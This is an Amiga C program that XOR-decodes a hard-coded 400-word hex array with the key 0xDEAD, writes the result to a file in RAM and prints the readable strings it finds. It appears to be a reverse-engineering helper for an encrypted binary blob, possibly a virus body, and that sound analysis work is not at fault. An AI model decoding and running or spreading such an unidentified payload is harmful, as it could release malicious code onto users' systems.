#include <proto/exec.h>
#include <proto/dos.h>
#include <stdio.h>
#include <string.h>

#define AND	&&
#define MAX 400

UWORD data[MAX] =
{
0xBFAD,
0xDC9B,
0xB9AD,
0xDF11,
0xBFA1,
0xBAC2,
0xAD83,
0xB2C4,
0xBCDF,
0xBFDF,
0xA7AD,
0xFCF2,
0x9003,
0x20C5,
0xB9AD,
0xDF09,
0xF4ED,
0x9D57,
0xDCED,
0xFC2D,
0xBFAD,
0xDC81,
0xB9AD,
0xDF23,
0xACAD,
0xAEBD,
0x3125,
0x9003,
0x23F9,
0xF8ED,
0xB9AD,
0xDFD3,
0xFCE6,
0x9F57,
0x21D3,
0xAEBD,
0x3125,
0x9003,
0x233D,
0xBE2F,
0x8DC3,
0xB1C2,
0xAEE9,
0xB1DE,
0xFEFE,
0xABDD,
0xAEC2,
0xACD9,
0xFEFD,
0xACC2,
0xBDC8,
0xADDE,
0xDEEE,
0xE4E0,
0xB1D8,
0xB0D9,
0xDEDF,
0xABC3,
0xFE93,
0x90E4,
0x9297,
0xFEC3,
0xBBDA,
0xADC5,
0xBBC1,
0xB28D,
0x8AEE,
0x8EAD,
0xEC99,
0xEC9C,
0x0000,
0xDEAD,
0x9D57,
0xDF7F,
0x94BC,
0xB8AD,
0xDFA5,
0x9757,
0x2162,
0xFCA1,
0xAA53,
0x9000,
0x2101,
0xFCAD,
0xB9AD,
0xDFB9,
0xF6AD,
0x9957,
0xDF11,
0xFAA6,
0x9000,
0x2137,
0xFCA9,
0x9000,
0x210B,
0xFE86,
0xDED1,
0xF8AD,
0xF1AD,
0xFEAE,
0xACAC,
0x96EC,
0x9003,
0x23F9,
0xF8ED,
0xB9AD,
0xDE5B,
0xFA91,
0xDEAD,
0xDD40,
0xFCA1,
0x9000,
0x214F,
0xF4AD,
0xFCA8,
0xB9AD,
0xDE4F,
0xFAA6,
0x9000,
0x217B,
0xFCA8,
0x9000,
0x2171,
0xFAE6,
0xFE87,
0xDEA5,
0x3B25,
0xF2AD,
0xD807,
0xDEAD,
0xDE02,
0xDEB9,
0xB51D,
0xEAD,
0xDEB5,
0x0B6D,
0xF6BF,
0x3B21,
0xD837,
0xDEAD,
0xDE02,
0x0B69,
0xEE87,
0x2153,
0xEC91,
0x90D8,
0xEA91,
0x90DC,
0x6CED,
0xB9A3,
0xEE87,
0x2151,
0x6CED,
0xB8AD,
0xDE3B,
0xEBEF,
0x2151,
0xEBEF,
0x2153,
0xFCA1,
0xFA91,
0xDEAD,
0xDD43,
0x9000,
0x214F,
0xF4AD,
0xFCA8,
0xFAA6,
0xD829,
0xDEAD,
0xDEB1,
0x062B,
0xF8A9,
0x9000,
0x217D,
0x9D57,
0xDFA9,
0xCC11,
0xDEAC,
0xFCA8,
0x9D57,
0x20F7,
0xFAA4,
0xF891,
0xDEAD,
0xDC11,
0xBFAD,
0x20F9,
0xFCA8,
0xF8B2,
0x4829,
0xFAA6,
0xA299,
0x000,
0x217D,
0xFCA8,
0x9000,
0x2171,
0xFCA1,
0x9D57,
0xDFCD,
0xFAA4,
0x9000,
0x20D9,
0xFCE6,
0x9003,
0x23E3,
0xBEB3,
0xFCC0,
0x21C1,
0xD2C4,
0xBE5D,
0x2153,
0xB9BF,
0x9D40,
0x21C1,
0x9F57,
0xDE2F,
0xFFFC,
0xDEAF,
0x9F57,
0xDEB9,
0xFC25,
0x15E4,
0x9003,
0x20CF,
0x9272,
0xA152,
0x90D8,
0xF8B2,
0xBE5D,
0x964A,
0x2153,
0x9957,
0xDE3C,
0x94BE,
0xB8FB,
0xBFF3,
0xB9FF,
0x9D57,
0xDE2B,
0xF4FC,
0xBFDF,
0xB9E5,
0xA4A8,
0xFCA8,
0x9000,
0x23DF,
0xBEA9,
0xBBD5,
0xAEC1,
0xFCAD,
0xB99B,
0x9757,
0x2027,
0xFAA1,
0xA8A9,
0x9000,
0x23F9,
0xF6AD,
0xFCA8,
0x9000,
0x23C1,
0x94E9,
0xB9B3,
0xC7D1,
0xDE97,
0xDEAE,
0x4751,
0xDEAD,
0xDEBE,
0xFCA1,
0xAAAD,
0xA8AD,
0x9000,
0x218F,
0x94ED,
0xB9A9,
0xC811,
0xDEAC,
0x9272,
0xA152,
0x9054,
0xDEAD,
0xDEAD,
0xF2D5,
0xDEA9,
0xFEC3,
0x2071,
0xD2FD,
0x6157,
0xB9A3,
0x9D57,
0x20A5,
0x9003,
0x2077,
0x942D,
0xD491,
0xDEA9,
0x90D8,
0xFEC0,
0x2131,
0xD2FD,
0x8C14,
0x0000,
0x90D8
};

VOID main (VOID)
{
	UWORD i, j;
	UWORD value = 0xDEAD;
	UWORD res;
	char c;
	BOOL n_flag = FALSE;
	char Hold[500];
	BPTR fh;

	printf ("\n");
	fh = Open ("ram:test.bin", MODE_NEWFILE);
	for (i = 0, j = 0; i < MAX; i++)
	{
		res = (value ^ data[i]);	// eor.w	d0,(a0)
		Write (fh, &res, 2);

		c = res>>8;
		if (c > 31 AND c < 127)	// ASCII only?
		{
			Hold[j] = c;
			j++;
			n_flag = FALSE;
		}
		else if (!n_flag)
		{
			Hold[j] = 0;;
			j = 0;
			if (strlen (Hold) >= 4)
				printf ("%s\n", Hold);
			n_flag = TRUE;
		}			

		c = (UBYTE)res;
		if (c > 31 AND c < 127)
		{
			Hold[j] = c;
			j++;
			n_flag = FALSE;
		}
		else if (!n_flag)
		{
			Hold[j] = 0;;
			j = 0;
			if (strlen (Hold) >= 4)
				printf ("%s\n", Hold);
			n_flag = TRUE;
		}
		printf ("\n");
	}
	Close (fh);
}
